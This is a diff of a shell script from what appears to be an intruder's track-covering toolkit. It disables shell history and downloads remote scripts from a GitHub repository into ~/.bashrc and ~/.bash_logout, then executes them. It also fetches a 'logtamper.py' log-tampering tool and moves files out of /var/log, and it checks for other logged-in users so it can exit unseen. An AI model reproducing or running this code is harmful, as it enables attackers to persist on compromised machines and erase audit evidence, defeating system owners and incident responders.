@@ -12,7 +12,7 @@ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
 export HISTFILE=/dev/null;
 export HISTSIZE=0;
 export HISTFILESIZE=0;
-export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >>     ~/.bashrc ;  bash ; . ~/.bash_logout" 
+export HACK="cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc;bash;. ~/.bash_logout" 
 REST="\e[0m"
 UNDERLINE="\e[4m"
 ColorRed="\e[31m"
@@ -38,7 +38,12 @@ function _bak {
 function _resume {
   for i in $(cat $index_f);
   do
-    cp -v $i /var/log/  2>/dev/null;
+    if [ -f $1 ];then
+      mv $i /var/log/  2>/dev/null;
+      if [ $? -eq 0 ];then
+	 gglog $i " [resume]"
+      fi 
+    fi 
   done
 }
 
@@ -71,7 +76,7 @@ exit_session() {
 }
 
 if [ !  -f $clear_shell ];then
-    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py' > $clear_shell; 
+    wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' > $clear_shell;
     gglog "Download logtamper ok"
 fi
 
@@ -85,7 +90,7 @@ gglog "bak /var/log/"
 
 gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
 trap exit_session SIGHUP
-wget --no-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout;
+wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout;
 if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
     gglog "warnning user is logined in !!!! , so exit ";
     ByeHack;
